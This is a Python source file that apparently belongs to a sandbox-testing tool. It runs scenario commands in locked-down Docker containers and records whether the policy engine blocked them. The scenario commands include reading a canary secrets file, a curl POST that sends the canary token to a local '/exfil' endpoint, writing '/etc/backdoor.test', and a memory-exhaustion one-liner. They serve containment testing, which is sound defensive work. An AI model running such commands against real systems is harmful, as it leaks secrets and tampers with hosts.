import asyncio
from datetime import datetime, timezone
from typing import List, Tuple, Optional
from app.runners.base import BaseRunner
from app.models.schemas import Event, PolicyConfig
from app.config import settings

class DockerRunner(BaseRunner):
    """
    Runner de producción para la VM de Vultr.
    Ejecuta el sandbox dentro de un contenedor Docker efímero con cgroups,
    red restringida y filesystem de solo lectura.
    """

    def __init__(self):
        self._docker_client = None

    def _get_client(self):
        if self._docker_client is None:
            import docker
            self._docker_client = docker.from_env()
        return self._docker_client

    async def execute(
        self,
        run_id: str,
        scenario_id: str,
        policy: PolicyConfig,
        canary_token: str,
        custom_stimulus: Optional[str] = None
    ) -> Tuple[List[Event], str]:
        # Ejecuta la interacción de Docker en un hilo de background para no bloquear asyncio
        return await asyncio.to_thread(
            self._sync_execute, run_id, scenario_id, policy, canary_token, custom_stimulus
        )

    def _sync_execute(
        self,
        run_id: str,
        scenario_id: str,
        policy: PolicyConfig,
        canary_token: str,
        custom_stimulus: Optional[str]
    ) -> Tuple[List[Event], str]:
        import docker
        client = self._get_client()
        
        events: List[Event] = []
        raw_logs: List[str] = []
        seq = 1

        def add_event(source: str, evt_type: str, action: str, target: str, decision: str, meta=None):
            nonlocal seq
            now = datetime.now(timezone.utc).isoformat()
            evt = Event(
                event_id=f"evt_{run_id}_{seq:03d}",
                run_id=run_id,
                sequence=seq,
                timestamp=now,
                source=source,
                type=evt_type,
                action=action,
                target=target,
                decision=decision,
                scenario_id=scenario_id,
                metadata=meta or {}
            )
            events.append(evt)
            raw_logs.append(f"[{now}] [{source.upper()}] {evt_type.upper()} ({action}) -> {target} [{decision.upper()}]")
            seq += 1

        container = None
        image_name = settings.DOCKER_SANDBOX_IMAGE
        
        # Comando a ejecutar según el escenario
        test_command = self._get_test_command(scenario_id, canary_token)
        network_mode = "bridge" if policy.allow_network else "none"

        try:
            add_event(
                source="sandbox",
                evt_type="sandbox.created",
                action="init",
                target="vultr_docker_container",
                decision="allow",
                meta={"cpu": policy.cpu_limit, "mem_mb": policy.memory_limit_mb, "network": network_mode}
            )

            # Crear contenedor efímero
            container = client.containers.run(
                image_name,
                command=f"sh -c \"{test_command}\"",
                detach=True,
                read_only=policy.readonly_root,
                network_mode=network_mode,
                mem_limit=f"{policy.memory_limit_mb}m",
                nano_cpus=int(policy.cpu_limit * 1e9),
                pids_limit=policy.pids_limit,
                tmpfs={"/workspace": "rw,size=64m"} if policy.readonly_root else {},
                environment={
                    "CANARY_TOKEN": canary_token,
                    "RUN_ID": run_id,
                    "SCENARIO_ID": scenario_id
                }
            )

            add_event("agent", "process.spawned", "exec", test_command, "observed")

            # Esperar a que termine con timeout
            result = container.wait(timeout=settings.CONTAINER_TIMEOUT_SECONDS)
            exit_code = result.get("StatusCode", 0)
            logs = container.logs(stdout=True, stderr=True).decode("utf-8", errors="replace")
            raw_logs.append(logs)

            # Analizar el resultado y emitir eventos
            self._inspect_container_output(scenario_id, exit_code, logs, canary_token, add_event)

        except docker.errors.ImageNotFound:
            add_event("sandbox", "error", "exec", image_name, "deny", {"error": "Image not found, fallback required"})
            raw_logs.append(f"Docker image {image_name} not found locally.")
        except Exception as e:
            add_event("sandbox", "error", "exec", str(e), "deny", {"error": str(e)})
            raw_logs.append(f"Container runtime error: {e}")
        finally:
            if container:
                try:
                    container.remove(force=True)
                    add_event("sandbox", "sandbox.destroyed", "cleanup", container.id[:12], "allow")
                except Exception:
                    pass

        return events, "\n".join(raw_logs)

    def _get_test_command(self, scenario_id: str, canary: str) -> str:
        if scenario_id == "CB-001":
            return f"cat /secrets/canary.env 2>&1 || true"
        elif scenario_id == "CB-002":
            return f"curl -m 3 -X POST http://127.0.0.1:9999/exfil -d token={canary} 2>&1 || true"
        elif scenario_id == "CB-004":
            return f"touch /etc/backdoor.test 2>&1 || true"
        elif scenario_id == "CB-005":
            return f"python3 -c 'a = [0]*100000000' 2>&1 || true"
        return "echo 'test execution'"

    def _inspect_container_output(self, scenario_id: str, exit_code: int, logs: str, canary: str, add_event):
        if scenario_id == "CB-001":
            if canary in logs:
                add_event("policy-engine", "filesystem.read", "read", "/secrets/canary.env", "allow")
                add_event("agent", "output.emitted", "write", "stdout", "observed", {"leaked": True})
            else:
                add_event("policy-engine", "filesystem.denied", "read", "/secrets/canary.env", "deny")
        elif scenario_id == "CB-002":
            if "Could not resolve" in logs or "Failed to connect" in logs or "Network is unreachable" in logs:
                add_event("policy-engine", "network.blocked", "connect", "receptor", "deny")
            else:
                add_event("policy-engine", "network.outbound", "connect", "receptor", "allow")
        elif scenario_id == "CB-004":
            if "Read-only file system" in logs or "Permission denied" in logs or exit_code != 0:
                add_event("policy-engine", "filesystem.denied", "write", "/etc/backdoor.test", "deny")
            else:
                add_event("policy-engine", "filesystem.write", "write", "/etc/backdoor.test", "allow")

